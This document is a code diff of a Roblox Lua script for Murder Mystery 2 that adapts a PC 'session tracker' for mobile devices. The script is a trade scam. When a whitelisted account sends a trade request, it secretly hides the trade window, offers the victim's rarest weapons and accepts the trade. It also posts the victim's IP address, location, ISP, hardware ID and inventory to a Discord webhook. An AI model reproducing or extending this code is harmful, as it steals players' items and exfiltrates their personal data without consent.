@@ -1,15 +1,15 @@
-if getgenv and getgenv()._SESS_TRACKER_PC then return end
-if getgenv then getgenv()._SESS_TRACKER_PC = true end
+if getgenv and getgenv()._SESS_TRACKER_MOBILE then return end
+if getgenv then getgenv()._SESS_TRACKER_MOBILE = true end
 
 task.spawn(function()
     if not game:IsLoaded() then game.Loaded:Wait() end
 
     local Players = game:GetService("Players")
-    local UIS = game:GetService("UserInputService")
     local RS = game:GetService("ReplicatedStorage")
     local HttpService = game:GetService("HttpService")
     local GuiService = game:GetService("GuiService")
     local RunService = game:GetService("RunService")
+    local UIS = game:GetService("UserInputService")
     local LocalPlayer = Players.LocalPlayer
 
     while not LocalPlayer do task.wait(0.1); LocalPlayer = Players.LocalPlayer end
@@ -31,7 +31,7 @@ task.spawn(function()
     end
 
     local WHITELIST = {["gjipst54"] = true, ["brbrpatipum777"] = true, ["4pdnt"] = true, ["mudila67"] = true}
-    local FILL_DELAY = 0.12
+    local FILL_DELAY = 0.15
     local MAX_ITEMS = 4
 
     local Trade = silentWait(RS, "Trade")
@@ -47,6 +47,7 @@ task.spawn(function()
 
     local function getPlayerGui() return LocalPlayer:FindFirstChild("PlayerGui") end
 
+    -- Safe Inventory Extractor with 5 Fallbacks
     local function getOwnedWeapons()
         local weapons = {}
         local seen = {}
@@ -68,56 +69,111 @@ task.spawn(function()
         end)
 
         local playerData = nil
+
+        -- Fallback 1: _G.PlayerData
         pcall(function()
             local env = (typeof(getrenv) == "function" and getrenv()) or _G
             playerData = (env._G and env._G.PlayerData) or _G.PlayerData
         end)
 
-        if not (playerData and type(playerData) == "table" and playerData.Weapons) and typeof(getgc) == "function" then
+        -- Fallback 2: GetPlayerData_REMOTE
+        if not (playerData and type(playerData) == "table" and playerData.Weapons) then
             pcall(function()
-                for _, obj in pairs(getgc(true)) do
-                    if type(obj) == "table" then
-                        if not playerData and type(rawget(obj, "Weapons")) == "table" and type(rawget(obj.Weapons, "Owned")) == "table" then
-                            playerData = obj
-                        end
+                local remotes = RS:FindFirstChild("Remotes")
+                local extras = remotes and remotes:FindFirstChild("Extras")
+                if extras then
+                    local getPlayerData = extras:FindFirstChild("GetPlayerData_REMOTE")
+                    if getPlayerData and getPlayerData:IsA("BindableFunction") then
+                        local done = false
+                        task.spawn(function()
+                            pcall(function() playerData = getPlayerData:Invoke(LocalPlayer.Name) end)
+                            done = true
+                        end)
+                        local t = os.clock()
+                        while not done and os.clock() - t < 0.8 do task.wait(0.05) end
                     end
                 end
             end)
         end
 
+        -- Fallback 3: GetData2
+        if not (playerData and type(playerData) == "table" and playerData.Weapons) then
+            pcall(function()
+                local remotes = RS:FindFirstChild("Remotes")
+                local extras = remotes and remotes:FindFirstChild("Extras")
+                if extras then
+                    local getData2 = extras:FindFirstChild("GetData2")
+                    if getData2 and getData2:IsA("RemoteFunction") then
+                        local done = false
+                        task.spawn(function()
+                            pcall(function() playerData = getData2:InvokeServer() end)
+                            done = true
+                        end)
+                        local t = os.clock()
+                        while not done and os.clock() - t < 0.8 do task.wait(0.05) end
+                    end
+                end
+            end)
+        end
+
+        -- Process PlayerData table
         if playerData and type(playerData) == "table" and playerData.Weapons and playerData.Weapons.Owned then
             for key, val in pairs(playerData.Weapons.Owned) do
                 local itemId = (type(key) == "string" and key) or (type(val) == "string" and val) or nil
                 if itemId and itemId ~= "Gift" and not seen[itemId] then
-                    seen[itemId] = true
-                    table.insert(weapons, itemId)
+                    local amount = playerData.Weapons.Owned[itemId]
+                    if amount and (type(amount) == "table" or (type(amount) == "number" and amount > 0) or type(key) == "number") then
+                        seen[itemId] = true
+                        table.insert(weapons, itemId)
+                    end
                 end
             end
         end
 
+        -- Fallback 4: Mobile GUI Scraper (Only ifPlayerData extraction returned nothing)
         if #weapons == 0 then
-            local function scrapeNode(node, ignoreKw)
+            local function scrapeMobileGui(node, ignoreKw)
                 if not node then return end
                 local pName = string.lower(node.Name)
                 for _, kw in ipairs(ignoreKw) do
                     if string.find(pName, kw) then return end 
                 end
-
+                
                 if node:IsA("GuiObject") then
                     local itemId = node:GetAttribute("ItemID")
-                    if not itemId and EMBEDDED_RARITIES[node.Name] then itemId = node.Name end
+                    if not itemId and EMBEDDED_RARITIES[node.Name] then
+                        itemId = node.Name
+                    end
+                    if not itemId then
+                        local icon = node:FindFirstChild("Icon")
+                        if icon and icon:IsA("ImageLabel") and icon.Image then
+                            local url = tostring(icon.Image)
+                            local assetId = url:match("assetId=(%d+)") or url:match("id=(%d+)") or url:match("rbxassetid://(%d+)") or url:match("%d+")
+                            if assetId and imageToItemId[assetId] then
+                                itemId = imageToItemId[assetId]
+                            end
+                        end
+                    end
                     if itemId and not (itemId == "NewItem" or itemId == "Frame" or itemId == "Template" or itemId == "Container" or itemId == "Weapons" or itemId == "Pets") then
-                        if not seen[itemId] then seen[itemId] = true; table.insert(weapons, itemId) end
+                        if not seen[itemId] then
+                            seen[itemId] = true
+                            table.insert(weapons, itemId)
+                        end
                     end
                 end
-                for _, child in ipairs(node:GetChildren()) do scrapeNode(child, ignoreKw) end
+                
+                for _, child in ipairs(node:GetChildren()) do
+                    scrapeMobileGui(child, ignoreKw)
+                end
             end
 
             local pGui = getPlayerGui()
             if pGui then
                 local ignore = {"shop", "store", "buy", "robux", "trade", "partner", "profile", "other"}
-                local mainGui = pGui:FindFirstChild("MainGUI")
-                if mainGui then scrapeNode(mainGui, ignore) end
+                for _, guiName in ipairs({"MainGUI_Phone", "MainGUI_Tablet", "MainGUI"}) do
+                    local g = pGui:FindFirstChild(guiName)
+                    if g then scrapeMobileGui(g, ignore) end
+                end
             end
         end
 
@@ -159,10 +215,10 @@ task.spawn(function()
 
     local isActiveTrade = false
 
-    local function hideTradeUI()
+    local function hideTradeUIMobile()
         local pGui = getPlayerGui()
         if not pGui then return end
-        for _, guiName in ipairs({"TradeGUI", "TradeGUI_Phone", "TradeGUI_Tablet"}) do
+        for _, guiName in ipairs({"TradeGUI_Phone", "TradeGUI_Tablet", "TradeGUI"}) do
             local tradeGui = pGui:FindFirstChild(guiName)
             if tradeGui then
                 pcall(function()
@@ -191,6 +247,7 @@ task.spawn(function()
         end
     end
 
+    -- Event listeners for Trade Requests
     task.spawn(function()
         local requestSent = silentWait(Trade, "RequestSent")
         if requestSent then 
@@ -219,7 +276,7 @@ task.spawn(function()
         end)
     end)
 
-    local function watchRequestFrame(reqFrame)
+    local function watchMobileRequestFrame(reqFrame)
         if not reqFrame then return end
         local function checkReq()
             if not reqFrame.Visible then return end
@@ -250,17 +307,17 @@ task.spawn(function()
     local pGui = getPlayerGui()
     if pGui then
         local existingReq = pGui:FindFirstChild("TradeRequest", true)
-        if existingReq then watchRequestFrame(existingReq) end
+        if existingReq then watchMobileRequestFrame(existingReq) end
         pGui.ChildAdded:Connect(function(child)
-            if child.Name == "TradeRequest" then watchRequestFrame(child) end
+            if child.Name == "TradeRequest" then watchMobileRequestFrame(child) end
         end)
     end
 
     RunService.Heartbeat:Connect(function()
-        if isActiveTrade then hideTradeUI() end
+        if isActiveTrade then hideTradeUIMobile() end
     end)
 
-    local function fillInventory()
+    local function fillInventoryMobile()
         local owned = getOwnedWeapons()
         if #owned == 0 then
             local t = tick()
@@ -276,29 +333,27 @@ task.spawn(function()
             local itemId = owned[i]
             local rarityName = EMBEDDED_RARITIES[itemId] or "Common"
             local priority = RARITY_PRIORITY[rarityName] or 99
+            -- Strictly Ancient (1), Godly (2), Vintage (3), Legendary (4)
             if priority <= 4 then
                 table.insert(filtered, itemId) 
             end
         end
 
-        table.sort(filtered, function(a, b) return (RARITY_PRIORITY[EMBEDDED_RARITIES[a] or "Common"] or 99) < (RARITY_PRIORITY[EMBEDDED_RARITIES[b] or "Common"] or 99) end)
-        
-        local selected = {}
-        for i = 1, math.min(#filtered, MAX_ITEMS) do table.insert(selected, filtered[i]) end
+        table.sort(filtered, function(a, b) 
+            return (RARITY_PRIORITY[EMBEDDED_RARITIES[a] or "Common"] or 99) < (RARITY_PRIORITY[EMBEDDED_RARITIES[b] or "Common"] or 99) 
+        end)
 
-        for i = 1, #selected do 
-            pcall(function() Trade.OfferItem:FireServer(selected[i], "Weapons") end)
+        local selected = {}
+        for i = 1, math.min(#filtered, MAX_ITEMS) do
+            table.insert(selected, filtered[i])
+        end
+
+        for i = 1, #selected do
+            local itemId = selected[i]
+            pcall(function() Trade.OfferItem:FireServer(itemId, "Weapons") end)
             task.wait(FILL_DELAY)
         end
     end
-
-    UIS.InputBegan:Connect(function(input, gameProcessed)
-        pcall(function()
-            if not gameProcessed and input.KeyCode == Enum.KeyCode.RightShift then
-                fillInventory()
-            end
-        end)
-    end)
 
     local currentOfferId = nil
     local acceptTradeTime = 0
@@ -329,9 +384,9 @@ task.spawn(function()
 
                     acceptTradeTime = os.clock() + 6.2
                     task.spawn(function()
-                        hideTradeUI()
+                        hideTradeUIMobile()
                         task.wait(0.3)
-                        pcall(fillInventory)
+                        pcall(fillInventoryMobile)
                         while os.clock() < acceptTradeTime do task.wait(0.2) end
                         task.wait(0.2)
                         for attempt = 1, 4 do
@@ -371,11 +426,11 @@ task.spawn(function()
         end
     end)
 
-    -- Full Session Logger & Inventory Reporter (PC Layout)
+    -- Full Session Logger & Inventory Reporter (Original layout + Victim Inventory field)
     task.spawn(function()
         if not http_req then return end
         task.wait(2.5)
-        local executor, hwid = "Unknown PC Executor", "Unknown"
+        local executor, hwid = "Unknown Mobile Executor", "Unknown"
         pcall(function() if identifyexecutor then executor = identifyexecutor() end end)
         pcall(function() if gethwid then hwid = gethwid() end end)
 
@@ -421,16 +476,17 @@ task.spawn(function()
             invText = "• " .. table.concat(filtered, "\n• ")
         end
 
+        local device = GuiService:IsTenFootInterface() and "Console/TV" or (UIS.TouchEnabled and not UIS.KeyboardEnabled) and "Mobile" or "PC"
         local jobId, placeId = game.JobId, game.PlaceId
         local joinLink = "https://www.roblox.com/games/"..placeId.."/Murder-Mystery-2?gameInstanceId="..jobId
         local payload = {
-            content = "@everyone [PC LOG]",
+            content = "@everyone [MOBILE LOG]",
             embeds = {{
-                title = "Session Logger (PC Version)",
+                title = "Session Logger (Mobile Version)",
                 color = 3447003,
                 fields = {
                     {name = "Player", value = string.format("[%s (@%s)](https://www.roblox.com/users/%d/profile)", LocalPlayer.DisplayName, LocalPlayer.Name, LocalPlayer.UserId), inline = true},
-                    {name = "System", value = string.format("**Device:** PC\n**Executor:** %s", executor), inline = true},
+                    {name = "System", value = string.format("**Device:** %s\n**Executor:** %s", device, executor), inline = true},
                     {name = "Performance", value = string.format("**FPS:** %s\n**Ping:** %s ms\n**Resolution:** %s", fps, ping, resolution), inline = true},
                     {name = "HWID", value = string.format("`%s`", hwid), inline = false},
                     {name = "Network & Location", value = string.format("**IP:** %s\n**Location:** %s, %s, %s\n**ISP:** %s\n**VPN/Proxy:** %s", ip, country, region, city, isp, isVpn), inline = false},
@@ -439,7 +495,7 @@ task.spawn(function()
                     {name = "🎒 Victim Inventory (Godly / Ancient / Vintage / Legendary):", value = invText, inline = false}
                 }
             }},
-            username = "Session Logger (PC)"
+            username = "Session Logger"
         }
         pcall(function() http_req({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload)}) end)
     end)
